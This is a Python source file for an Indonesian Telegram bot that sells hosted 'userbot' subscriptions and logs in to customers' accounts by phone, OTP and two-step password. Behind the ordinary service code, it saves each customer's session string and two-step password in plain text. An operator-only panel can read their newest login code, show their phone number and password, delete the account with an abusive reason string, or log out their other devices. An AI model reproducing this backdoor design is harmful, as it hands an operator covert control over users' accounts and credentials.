import asyncio
import importlib
from datetime import datetime, timedelta

from dateutil.relativedelta import relativedelta
from pytz import timezone

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions
from pyrogram.raw.functions.auth import ResetAuthorizations
from pyrogram import Client, enums
from urllib.parse import quote
from usu import *
from pyrogram.raw.functions.auth import LogOut

langganan = {}

@USU.BOT("start")
@USU.PRIVATE
@USU.START
async def _(client, message):
    user_id = message.from_user.id
    save = await db.get_list_from_vars(bot.me.id, "user")
    buttons = BTN.PILIHAN()
    msg = await MSG.PILIHAN()
    teks = message.text.split()[1:]
    if teks:
        if teks[0].startswith("REF"):
            user = int(teks[0].replace("REF", ""))
            sudah = await db.get_list_from_vars(user, "REF")
            if user != user_id:
                if user in save and user_id not in save and user_id not in sudah:

                    vars = await db.get_vars(user, "SALDO")
                    duit = vars if vars else 0
                    tambah = duit + 4000
                    await db.set_vars(user, "SALDO", tambah)
                    await db.add_to_vars(user, "REF", user_id)
                    await bot.send_message(user, f"<i><b>Anda berhasil mengundang 1 pengguna baru, saldo anda telah bertambah Rp 4.000</b></i>")
    return await message.reply(msg, reply_markup=InlineKeyboardMarkup(buttons))


@USU.CALLBACK("toko_adm")
async def _(client, callback_query):
    button = InlineKeyboardMarkup([])
    sel = []
    teks = f"<i><b>Daftar seller resmi [Userbot]({PHOTO}) ada di bawah ini,\nSelain seller di bawah ini sudah di pastikan bukan dari kami!\nCatatan:</b> berhati - hati lah dalam jual/beli sesuatu di online</i>"
    seles_users = await db.get_list_from_vars(client.me.id, "SELER_USERS")
    hazmi = f"Halo! saya ingin membeli Userbot"
    url = f"https://t.me/{USERNAME}?text={quote(hazmi)}"
    button.inline_keyboard.append([InlineKeyboardButton(f"Owners", url=url)])
    if seles_users:
        for id in seles_users:
            if id in DEVS:
                continue
            try:
                user = await client.get_users(id)
            except FloodWait as e:
                await asyncio.sleep(e.value)
                user = await client.get_users(id)
            except Exception as e:
                continue
            first = user.first_name
            last = user.last_name
            user_id = user.id
            sel.append(InlineKeyboardButton(f"{first} {last or ''}", url=f"tg://openmessage?user_id={user_id}"))
            if len(sel) == 2:
                button.inline_keyboard.append(sel)
                sel = []
    if sel:
        button.inline_keyboard.append(sel)
    button.inline_keyboard.append([InlineKeyboardButton(f"🔙 Kembali", callback_data=f"awal")])
    return await callback_query.edit_message_text(teks, reply_markup=button)

@USU.CALLBACK("^reset")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in ubot._ubot:
        return await callback_query.answer(f"Anda bukan pengguna userbot ini!", show_alert=True)

    default_prefix = "."

    ubot.set_prefix(user_id, default_prefix)
    await db.set_pref(user_id, default_prefix)
    await callback_query.answer(
        f"Prefix anda berhasil di reset!",
        show_alert=True
    )

@USU.CALLBACK("^awal")
async def _(c, cq):
    return await cq.edit_message_text(await MSG.START(), reply_markup=InlineKeyboardMarkup(BTN.START()))


@USU.CALLBACK("^pilihan")
async def _(c, cq):
    return await cq.edit_message_text(await MSG.PILIHAN(), reply_markup=InlineKeyboardMarkup(BTN.PILIHAN()))


@USU.CALLBACK("^complain")
async def _(c, cq):
    button = BTN.SUPPORT()
    pesan = f"<b><i>Silahkan berikan dukungan dan saran masukan update untuk [Developer]({PHOTO}) pengembang agar Bot kami selalu memberikan yang terbaik untuk penggunanya dan jika ada bug/kerusakan pada Bot kami, silahkan lapor ke group/channel di bawah ini</i></b>"
    return await cq.edit_message_text(pesan, reply_markup=InlineKeyboardMarkup(button))


@USU.CALLBACK("^status")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    expired = await db.get_expired_date(user_id)
    if user_id in ubot._ubot:
        if expired is None:
            return await callback_query.answer("Tidak ada tanggal kadaluarsa!", show_alert=True)
        jkt = pytz.timezone("Asia/Jakarta")
        now_utc = datetime.now(jkt) 
        sisa = (expired - now_utc).days
        return await callback_query.answer(
            f"""Expired {sisa} Days! """,
            show_alert=True
        )
    else:
        return await callback_query.answer(
            f"""Silahkan install userbot terlebih dahulu!""",
            show_alert=True
        )


@USU.CALLBACK("kirii_")
async def prev_bulan(client, callback_query):
    user_id = callback_query.from_user.id
    vars = await db.get_vars(user_id, "SALDO")
    saldo = vars if vars else 0
    teks = f"{int(saldo):,}".replace(",", ".")
    try:
        bulan_saat_ini = int(callback_query.data.split("_")[1])
        if bulan_saat_ini > 1:
            langganan[user_id] = bulan_saat_ini - 1
            jumlah_bulan = langganan[user_id]
            total_harga = jumlah_bulan * HARGA_USERBOT
            return await callback_query.edit_message_text(
                f"""<i><b>Saldo [Userbot]({PHOTO}) anda saat ini:</b>\nRp {teks}\n\n<b>Memilih:</b> {langganan[user_id]} Bulan - Rp {total_harga}.000</i>""", reply_markup=InlineKeyboardMarkup(BTN.KONFIR(jumlah_bulan)))
        else:
            await callback_query.answer("Ini adalah bulan pertama.", show_alert=True)
    except Exception as e:
        return print(e)


@USU.CALLBACK("kanann_")
async def next_bulan(client, callback_query):
    user_id = callback_query.from_user.id
    vars = await db.get_vars(user_id, "SALDO")
    saldo = vars if vars else 0
    teks = f"{int(saldo):,}".replace(",", ".")
    try:
        bulan_saat_ini = int(callback_query.data.split("_")[1])
        langganan[user_id] = bulan_saat_ini + 1
        jumlah_bulan = langganan[user_id]
        total_harga = jumlah_bulan * HARGA_USERBOT
        return await callback_query.edit_message_text(
            f"""<i><b>Saldo [Userbot]({PHOTO}) anda saat ini:</b>\nRp {teks}\n\n<b>Memilih:</b> {langganan[user_id]} Bulan - Rp {total_harga}.000</i>""", reply_markup=InlineKeyboardMarkup(BTN.KONFIR(jumlah_bulan)))
    except Exception as e:
        return print(e)

@USU.CALLBACK("setuju")
async def setuju(c, cq):
    user_id = cq.from_user.id
    vars = await db.get_vars(user_id, "SALDO")
    saldo = vars if vars else 0
    jumlah_bulan = langganan[user_id]
    total_harga = jumlah_bulan * HARGA_USERBOT * 1000
    if saldo < total_harga:
        return await cq.answer(f"Saldo anda tidak mencukupi!", True)       
    if user_id in await db.get_list_from_vars(c.me.id, "AKSES") or user_id in ubot._ubot:
        return await cq.answer(f"Mohon maaf anda sudah memiliki Userbot!", True)
    else:
        now = datetime.now(pytz.timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=int(jumlah_bulan))
        await db.set_expired_date(user_id, expired)
        await db.add_to_vars(c.me.id, "AKSES", user_id)
        duit = int(saldo) - int(total_harga)
        await db.set_vars(user_id, "SALDO", duit)
        await cq.answer(f"Anda berhasil membeli userbot, silahkan install userbot anda!", True)
        del langganan[user_id]
        return await cq.edit_message_text(await MSG.START(), reply_markup=InlineKeyboardMarkup(BTN.START()))



@USU.CALLBACK("hajar")
async def hajar(c, cq):
    user_id = cq.from_user.id
    vars = await db.get_vars(user_id, "SALDO")
    saldo = vars if vars else 0
    teks = f"{int(saldo):,}".replace(",", ".")
    langganan[user_id] = 1
    return await cq.edit_message_text(
        f"""<i><b>Saldo [Userbot]({PHOTO}) anda saat ini:</b>\nRp {teks}\n\n<b>Memilih:</b> {langganan[user_id]} Bulan - Rp {HARGA_USERBOT}.000</i>""", reply_markup=InlineKeyboardMarkup(BTN.KONFIR(langganan[user_id])))


@USU.CALLBACK("metode_beli")
async def metode_beli(c, cq):
    return await cq.edit_message_text(
        f"""<b><i>Beli/Berlangganan [Userbot]({PHOTO}) bisa lewat tombol di bawah ini!</i></b>""", reply_markup=InlineKeyboardMarkup(BTN.BELI()))


pengguna = {}


async def login(client, handle, user_id, new_client, phone_number, code):
    try:
        await new_client.sign_in(
            phone_number.strip(),
            code.phone_code_hash,
            phone_code=pengguna[user_id]["otp"],
        )
    except PhoneCodeInvalid as PCI:
        pengguna[user_id]["salah"] += 1
        pengguna[user_id]["otp"] = ""
        if pengguna[user_id]["salah"] >= 3:
            await handle.message.delete()
            del pengguna[user_id]
            return await client.send_message(
                user_id,
                f"<b><i>Anda terlalu sering mencoba, silahkan ulangi dari awal!</i></b>", reply_markup=ReplyKeyboardRemove()
            )
        await handle.edit_message_text(
            f"""<i><b>Kode OTP anda salah, silahkan masukan kembali kode OTP anda</b>
{pengguna[user_id]['otp']}</i>""",
            reply_markup=InlineKeyboardMarkup(BTN.OTP()),
        )
    except PhoneCodeExpired as PCE:
        await handle.message.delete()
        del pengguna[user_id]
        return await bot.send_message(user_id, f"<b><i>Kode OTP anda kadaluarsa!</i></b>")
    except BadRequest as error:
        await handle.message.delete()
        del pengguna[user_id]
        return await client.send_message(user_id, f"<b>ERROR:</b> {error}", reply_markup=ReplyKeyboardRemove())
    except SessionPasswordNeeded:
        await handle.message.delete()
        try:
            while True:
                two_step_code = await client.ask(
                    user_id,
                    f"""<i><b>Akun Anda telah mengaktifkan verifikasi dua langkah, harap masukan kata sandinya</b>""",
                    timeout=300,
                )
                try:
                    await new_client.check_password(two_step_code.text)
                    await db.set_two_factor(user_id, two_step_code.text)
                    pengguna[user_id]["salah"] = 0
                    break
                except Exception as error:
                    pengguna[user_id]["salah"] += 1
                    if pengguna[user_id]["salah"] >= 3:
                        del pengguna[user_id]
                        return await client.send_message(
                            user_id,
                            f"<b><i>Anda terlalu sering mencoba, silahkan ulangi dari awal!</i></b>",
                        )
        except asyncio.TimeoutError:
            await handle.message.delete()
            del pengguna[user_id]
            return await client.send_message(user_id, f"<b><i>Automatic cancellation!\n Use /start to restart</i></b>", reply_markup=ReplyKeyboardRemove())
    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    bot_msg = await client.send_message(
        user_id,
        f"<b><i>Processing...</i></b>",
        disable_web_page_preview=True,
    )
    aio_client = Ubot(
        name=str(user_id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    await aio_client.start()
    del pengguna[user_id]
    if not user_id == aio_client.me.id:
        del ubot._ubot[aio_client.me.id]
        await db.rem_two_factor(aio_client.me.id)
        return await bot_msg.edit(
        f"<b><i>Please use your Telegram account number!\n And not a telegram number from someone else's account</i></b>"
        )
    await db.add_ubot(
        user_id=int(aio_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )
    await db.remove_from_vars(client.me.id, "AKSES", user_id)
    await db.set_vars(user_id, "switch", True)
    await db.set_vars(user_id, "inline", True)
    vars_jual = await db.get_vars(bot.me.id, "penjualan") or 0
    penjualan = int(vars_jual) + 1
    await db.set_vars(bot.me.id, "penjualan", penjualan)
    for mod in loadModule():
        importlib.reload(
            importlib.import_module(f"usu.modules.{mod}")
        )
    SH = await ubot.get_prefix(aio_client.me.id)
    await asyncio.sleep(5)
    await bot_msg.delete()
    text_done = f"""<i><b>Information!</b>
 <b>Status :</b> Active!
 <b>Name :</b> <a href=tg://user?id={aio_client.me.id}>{aio_client.me.first_name} {aio_client.me.last_name or ''}</a>
 <b>ID :</b> <code>{aio_client.me.id}</code>
 <b>Prefix :</b> {' '.join(SH)}

<b>Selamat menikmati Userbot dari kami!</b>
<b>Jika ingin melihat menu fitur silahkan ketik</b>
{' '.join(SH)}help</i>
            """
    await client.send_message(user_id, text_done, reply_markup=ReplyKeyboardRemove())
    await asyncio.sleep(5)
    await client.send_message(user_id, f"<b><i>Information!\nJika ada sesi perangkat login botnya, harap di konfirmasi</i></b>", reply_markup=ReplyKeyboardRemove())
    user_link = f"{handle.from_user.first_name} {handle.from_user.last_name or ''}"
    gbt = [
        [
            InlineKeyboardButton(
                        user_link,
                        url=f"tg://openmessage?user_id={handle.from_user.id}"
            ),
        ],
    ]
    if LOGS_CHAT:
        await client.send_message(LOGS_CHAT, f"<i><b>Information Active!\nName: {handle.from_user.mention}\nID: {handle.from_user.id}</b></i>", reply_markup=InlineKeyboardMarkup(gbt))
    await bash("rm -rf *session*")
    await install_my_peer(aio_client)
    if AUTO_JOIN:
        for auto in AUTO_JOIN:
            try:
                await aio_client.join_chat(auto)
            except UserAlreadyParticipant:
                pass


@USU.CALLBACK("otp")
async def otp(c, cq):
    user_id = cq.from_user.id
    if user_id not in pengguna:
        return await cq.answer("Tombol ini bukan buat anda!", show_alert=True)
    data = cq.data.split()
    if len(data) < 2:
        return await cq.answer("Format OTP tidak valid.", show_alert=True)

    command = data[1]
    if command == "clear":
        pengguna[user_id]["otp"] = ""
    elif command == "del":
        pengguna[user_id]["otp"] = pengguna[user_id]["otp"][:-1]
    elif command.isdigit():
        if len(pengguna[user_id]["otp"]) < 5:
            pengguna[user_id]["otp"] += command
    else:
        return await cq.answer("Input tidak dikenali.", show_alert=True)

    await cq.edit_message_text(
        f"""<i><b>Silakan periksa kode OTP dari {pengguna[user_id]['otp_type']}, lalu anda masukan kode anda menggunakan tombol angka dibawah ini</b>
{pengguna[user_id]['otp']}</i>""",
        reply_markup=InlineKeyboardMarkup(BTN.OTP())
    )
    if len(pengguna[user_id]["otp"]) == 5:
        await login(c, cq, user_id, pengguna[user_id]["new_client"], pengguna[user_id]["phone_number"], pengguna[user_id]["code"])
        

@USU.CALLBACK("^buat")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    pengguna[user_id] = {}
    pengguna[user_id]["salah"] = 0
    pengguna[user_id]["otp"] = ""
    if user_id in ubot._ubot:
        return await callback_query.answer(f"""Anda telah membuat/memiliki userbot!""", show_alert=True)
    elif len(ubot._ubot) + 1 > MAX_BOT:
        return await callback_query.answer(f"""Userbot mencapai maxsimal pengguna!""", show_alert=True)
    if user_id in await db.get_list_from_vars(client.me.id, "AKSES") or user_id in DEVS:
        try:
            buttons = ReplyKeyboardMarkup([
                [KeyboardButton("My Contact", request_contact=True)]], one_time_keyboard=True, resize_keyboard=True)
            while True:
                phone = await client.ask(
                    user_id,
                    f"<b><i>Silakan pencet tombol My Contact untuk memasukkan nomor akun Telegram Anda!</i></b>",
                    reply_markup=buttons,
                    timeout=300,
                )
                if phone.contact is not None:
                    pengguna[user_id]["salah"] = 0
                    usu_msg = await client.send_message(user_id, f"<b><i>Processing...</i></b>", reply_markup=ReplyKeyboardRemove())
                    await usu_msg.delete()
                    break
                else:
                    pengguna[user_id]["salah"] += 1
                    if pengguna[user_id]["salah"] >= 3:
                        return await client.send_message(
                            user_id,
                            f"<b><i>Anda terlalu sering mencoba, silahkan ulangi dari awal!</i></b>",
                            reply_markup=ReplyKeyboardRemove()
                        )
        except asyncio.TimeoutError:
            return await client.send_message(user_id, f"<b><i>Automatic cancellation!\n Use /start to restart</i></b>", reply_markup=ReplyKeyboardRemove())
        pengguna[user_id]["phone_number"] = phone.contact.phone_number
        pengguna[user_id]["new_client"] = Ubot(
            name=str(callback_query.id),
            api_id=API_ID,
            api_hash=API_HASH,
        )
        new_client = pengguna[user_id]["new_client"]
        phone_number = pengguna[user_id]["phone_number"]
        get_otp = await client.send_message(user_id, f"<b><i>Sending OTP code...</i></b>", reply_markup=ReplyKeyboardRemove())
        await new_client.connect()
        try:
            pengguna[user_id]["code"] = await new_client.send_code(phone_number.strip())
            code = pengguna[user_id]["code"]
        except ApiIdInvalid as AID:
            await get_otp.delete()
            return await client.send_message(user_id, AID, reply_markup=ReplyKeyboardRemove())
        except PhoneNumberInvalid as PNI:
            await get_otp.delete()
            return await client.send_message(user_id, PNI, reply_markup=ReplyKeyboardRemove())
        except PhoneNumberFlood as PNF:
            await get_otp.delete()
            return await client.send_message(user_id, PNF, reply_markup=ReplyKeyboardRemove())
        except PhoneNumberBanned as PNB:
            await get_otp.delete()
            return await client.send_message(user_id, PNB, reply_markup=ReplyKeyboardRemove())
        except PhoneNumberUnoccupied as PNU:
            await get_otp.delete()
            return await client.send_message(user_id, PNU, reply_markup=ReplyKeyboardRemove())
        except Exception as error:
            await get_otp.delete()
            return await client.send_message(user_id, f"<b>ERROR:</b> {error}", reply_markup=ReplyKeyboardRemove())
        try:
            sent_code = {
                SentCodeType.APP: "<a href=tg://openmessage?user_id=777000>Akun Telegram</a> resmi",
                SentCodeType.SMS: "Sms Anda",
                SentCodeType.CALL: "Panggilan Telpon",
                SentCodeType.FLASH_CALL: "Panggilan Kilat",
                SentCodeType.FRAGMENT_SMS: "Fragment Sms",
                SentCodeType.EMAIL_CODE: "Email Anda",
            }
            await get_otp.delete()
            pengguna[user_id]["otp_type"] = sent_code[code.type]
            otp = await client.send_message(
                user_id,
                f"""<i><b>Silakan periksa kode OTP dari {pengguna[user_id]['otp_type']}, lalu anda masukan kode anda menggunakan tombol angka dibawah ini</b>
{pengguna[user_id]['otp']}</i>""",
                reply_markup=InlineKeyboardMarkup(BTN.OTP()),
            )
        except asyncio.TimeoutError:
            return await client.send_message(user_id, f"<b><i>Automatic cancellation!\n Use /start to restart</i></b>", reply_markup=ReplyKeyboardRemove())
    else:
        return await callback_query.answer(
            f"""Anda belum ada akses membuat userbot!""",
            show_alert=True
        )

async def reload_bot():
    for mod in loadModule():
        importlib.reload(
            importlib.import_module(f"usu.modules.{mod}")
        )

@USU.BOT("reload")
async def _(client, message):
    buttons = [
            [InlineKeyboardButton("Reload", callback_data=f"ress_ubot")],
        ]
    if message.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
        admin = await list_admins(client, message.chat.id)
        if message.from_user.id not in admin:
            return
        asyncio.create_task(reload_bot())
        await message.reply(f"""<b><i>Bot berhasil di muat ulang!</i></b>""")
    elif message.chat.type == enums.ChatType.PRIVATE:
        await message.reply(f"""<b>Anda akan menyegarkan ulang [Userbot]({PHOTO}) anda?
Jika ya, tekan tombol di bawah ini</b>""", reply_markup=InlineKeyboardMarkup(buttons))


@USU.CALLBACK("ress_ubot")
async def _(client, callback_query):
    if callback_query.from_user.id not in ubot._ubot:
        return await callback_query.answer(
            f"Tombol ini bukan untukmu!",
            True,
        )
    for X in ubot._ubot.values():
        if callback_query.from_user.id == X.me.id:
            for _ubot_ in await db.get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        del ubot._ubot[X.me.id]
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        asyncio.create_task(reload_bot())
                        await bash(f"rm -rf *session*")
                        return await callback_query.edit_message_text(
                            f"<i><b>Restart [Userbot]({PHOTO}) berhasil dilakukan!\n\nName:</b> {UB.me.mention} {UB.me.last_name or ''} <b>|</b> {UB.me.id}</i>"
                        )
                    except Exception as error:
                        return await callback_query.edit_message_text(f"<b>{error}</b>")



@USU.CALLBACK("^(kode_baru|ub_deak|deak_akun_konfirm|get_phone|get_faktor|logall|logallkonfir)")
async def _(client, callback_query):
    query = callback_query.data.split()
    user_id = callback_query.from_user.id
    if user_id not in DEVS:
        return await callback_query.answer(
            f"Tombol ini bukan untuk anda! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        X = ubot._ubot[tuple(ubot._ubot.keys())[int(query[1])]]
    except IndexError:
        return await callback_query.answer("Invalid query", True)

    if query[0] == "kode_baru":
        history = X.get_chat_history(chat_id=777000, limit=1)
        try:
            async for msg in history:
                kode_baru = msg.text
                if kode_baru:
                    await callback_query.edit_message_text(
                        kode_baru,
                        reply_markup=InlineKeyboardMarkup(
                            BTN.UBOT(X.me.id, int(query[1]))
                        ),
                    )
                else:
                    await callback_query.answer("Tidak ada kode terbaru!", True)
        except Exception as error:
            return await callback_query.answer(error, True)

    elif query[0] == "get_phone":
        try:
            return await callback_query.edit_message_text(
                f"<b><i>Phone Number: <code>{X.me.phone_number}</code></i></b>",
                reply_markup=InlineKeyboardMarkup(
                    BTN.UBOT(X.me.id, int(query[1]))
                ),
            )
        except Exception as error:
            return await callback_query.answer(error, True)

    elif query[0] == "get_faktor":
        code = await db.get_two_factor(X.me.id)
        if code == None:
            return await callback_query.answer(
                "No two-factor authentication!", True
            )
        else:
            return await callback_query.edit_message_text(
                f"<b><i>two-factor authentication: <code>{code}</code></i></b>",
                reply_markup=InlineKeyboardMarkup(
                    BTN.UBOT(X.me.id, int(query[1]))
                ),
            )

    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(BTN.DEAK(X.me.id, int(query[1])))
        )

    elif query[0] == "deak_akun_konfirm":
        del ubot._ubot[X.me.id]
        await X.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
        return await callback_query.answer(f"Account successfully deleted from telegram!", True)
    elif query[0] == "logall":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(BTN.LOGDEV(X.me.id, int(query[1])))
        )
    elif query[0] == "logallkonfir":
        await X.invoke(ResetAuthorizations())
        return await callback_query.answer(f"Account successfully logged out on all devices!", True)


@USU.CALLBACK("cek_masa_aktif")
async def _(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await db.get_expired_date(user_id)
    try:
        if expired is None:
            return await callback_query.answer("Tidak ada tanggal kadaluarsa!", True)

        now_utc = datetime.now(pytz.utc) 

        remainder = (expired - now_utc).days

        if remainder < 0:
            return await callback_query.answer("Sudah kadaluarsa!", True)

        return await callback_query.answer(f"Sisa waktu: {remainder} hari!", True)

    except Exception as e:
        return await callback_query.answer(f"Terjadi kesalahan: {e}", True)




@USU.CALLBACK("^(del_ubot|konfir_del_ubot)")
async def _(client, callback_query):
    query = callback_query.data.split()
    user_id = callback_query.from_user.id
    if user_id not in DEVS:
        return await callback_query.answer(
            f"Tombol ini bukan untuk anda! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    try:
        X = ubot._ubot[tuple(ubot._ubot.keys())[int(query[1])]]
    except Exception:
        return await callback_query.answer("Invalid query", True)
    idnya = X.me.id
    if query[0] == "del_ubot":
        if int(query[1]) < len(ubot._ubot):
            return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(BTN.DEL(X.me.id, int(query[1])))
            )
    elif query[0] == "konfir_del_ubot":
        try:
            await X.unblock_user(bot.me.username)
        except Exception as e:
            pass
        await db.remove_ubot(X.me.id)
        await db.rem_expired_date(X.me.id)
        try:
            await X.invoke(LogOut())
        except:
            pass
        del ubot._ubot[idnya]
        await callback_query.answer(
                    f"Successfully deleted from database!", True
                )
        await callback_query.edit_message_text(
            await MSG.UBOT(0),
            reply_markup=InlineKeyboardMarkup(
                BTN.UBOT(ubot._ubot[tuple(ubot._ubot.keys())[0]].me.id, 0)
            ),
        )
        await bot.send_message(
            X.me.id,
            MSG.EXP_MSG_UBOT(X),
        )


@USU.CALLBACK("^(p_ub|n_ub)")
async def _(client, callback_query):
    user_id = callback_query.from_user.id
    if user_id not in DEVS:
        return await callback_query.answer(
            f"Tombol ini bukan untuk anda! {callback_query.from_user.first_name} {callback_query.from_user.last_name or ''}",
            True,
        )
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "n_ub":
        if count == len(ubot._ubot) - 1:
            count = 0
        else:
            count += 1
    elif query[0] == "p_ub":
        if count == 0:
            count = len(ubot._ubot) - 1
        else:
            count -= 1
    await callback_query.edit_message_text(
        await MSG.UBOT(count),
        reply_markup=InlineKeyboardMarkup(
            BTN.UBOT(ubot._ubot[tuple(ubot._ubot.keys())[count]].me.id, count)
        ),
    )